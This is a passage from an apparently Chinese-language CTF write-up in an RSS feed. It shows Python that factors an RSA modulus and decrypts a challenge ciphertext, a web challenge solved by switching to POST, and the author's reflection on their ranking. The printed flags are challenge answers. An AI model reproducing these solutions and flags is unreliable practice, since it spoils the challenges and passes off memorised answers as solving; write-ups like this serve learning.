+print(q)
+print(p*q==n)
+#输出
+#l=2331时的key是: #24440283427735860782323152407294917357529111353275570975703531438440519660225708967888657253644278000783263820558388701592370615088140947096898134081330591301984360290318641970617489021626752360815885812583176251873031239638493762071047588297627032203293985708994218852662838640238623254740905447146670999830187552717802257362427107073858485019955606331947972091793616373347825119600328855885246072890798551616534636247023983959037046475229361825549780845049341719145179099452625523855259198581865855234803188298849910863377098140158406245399677912502444220011884063994451182221171275547685147549629637310805120815512
+#---
+#24440283427735860782323152407294917357529111353275570975703531438440519660225708967888657253644278000783263820558388701592370615088140947096898134081330591301984360290318641970617489021626752360815885812583176251873031239638493762071047588297627032203293985708994218852662838640238623254740905447146670999830187552717802257362427107073858485019955606331947972091793616373347825119600328855885246072890798551616534636247023983959037046475229361825549780845049341719145179099452625523855259198581865855234803188298849910863377098140158406245399677912502444220011884063994451182221171275547685147549629637310805120817903
+#---
+#30246942489892106712702239024133721453592842183923733460515110118344404699532017493383428137697227815754741688919151294652492006534840589468962295623069884232619077280815851563195685517196295248643553001644121714958636538938848623892827992267767358030468030240236589927767000556188518269847757669474128501561192367465343050094302650720121351543751423298130335191141395620744634566228434135430114855211983270131333333081108536699301711234514426855659414263828163630092200163488598896179597996128556748173083374014319100056717308084410389660477779719495877439609162161870536882293104016630319703274657500915447940613453
+#True
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;验证发现就是所求的p，q，之后使用加密原理，算逆元d，以求解flag&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from Crypto.Util.number import *
+from gmpy2 import invert
+p=24440283427735860782323152407294917357529111353275570975703531438440519660225708967888657253644278000783263820558388701592370615088140947096898134081330591301984360290318641970617489021626752360815885812583176251873031239638493762071047588297627032203293985708994218852662838640238623254740905447146670999830187552717802257362427107073858485019955606331947972091793616373347825119600328855885246072890798551616534636247023983959037046475229361825549780845049341719145179099452625523855259198581865855234803188298849910863377098140158406245399677912502444220011884063994451182221171275547685147549629637310805120817903
+q=30246942489892106712702239024133721453592842183923733460515110118344404699532017493383428137697227815754741688919151294652492006534840589468962295623069884232619077280815851563195685517196295248643553001644121714958636538938848623892827992267767358030468030240236589927767000556188518269847757669474128501561192367465343050094302650720121351543751423298130335191141395620744634566228434135430114855211983270131333333081108536699301711234514426855659414263828163630092200163488598896179597996128556748173083374014319100056717308084410389660477779719495877439609162161870536882293104016630319703274657500915447940613453
+e=65537
+c=229043746793674889024653533006701296308351926745769842802636384094759379740300534278302123222014817911580006421847607123049816103885365851535481716236688330600113899345346872012870482410945158758991441294885546642304012025685141746649427132063040233448959783730507539964445711789203948478927754968414484217451929590364252823034436736148936707526491427134910817676292865910899256335978084133885301776638189969716684447886272526371596438362601308765248327164568010211340540749408337495125393161427493827866434814073414211359223724290251545324578501542643767456072748245099538268121741616645942503700796441269556575769250208333551820150640236503765376932896479238435739865805059908532831741588166990610406781319538995712584992928490839557809170189205452152534029118700150959965267557712569942462430810977059565077290952031751528357957124339169562549386600024298334407498257172578971559253328179357443841427429904013090062097483222125930742322794450873759719977981171221926439985786944884991660612824458339473263174969955453188212116242701330480313264281033623774772556593174438510101491596667187356827935296256470338269472769781778576964130967761897357847487612475534606977433259616857569013270917400687539344772924214733633652812119743
+n = p * q
+phi_n = (p - 1) * (q - 1)
+d = invert(e, phi_n)
+m = pow(c, d, n)
+flag = long_to_bytes(m)
+print(flag.decode())
+#输出
+#flag{77310934-21fa-4ee4-a783-dc1865ebab28}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;flag值：
+flag{77310934-21fa-4ee4-a783-dc1865ebab28}&lt;/p&gt;
+&lt;h2&gt;12、ezGetFlag&lt;/h2&gt;
+&lt;p&gt;操作内容：
+多点几次提示要用post
+于是就听劝，将方法改为post&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/2024-11-24/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;flag值：
+flag{1aae46ab-3407-469f-955a-f3729a8e13ff}&lt;/p&gt;
+&lt;h1&gt;四、总结&lt;/h1&gt;
+&lt;p&gt;虽然说成绩只是87名，后来公众号公布的76名，但是对于初出茅庐的我来说已经很高兴了，希望以后能在CTF的路上走的更远
+加油！
+d=====(￣▽￣*)b&lt;/p&gt;
+</content:encoded></item></channel></rss>
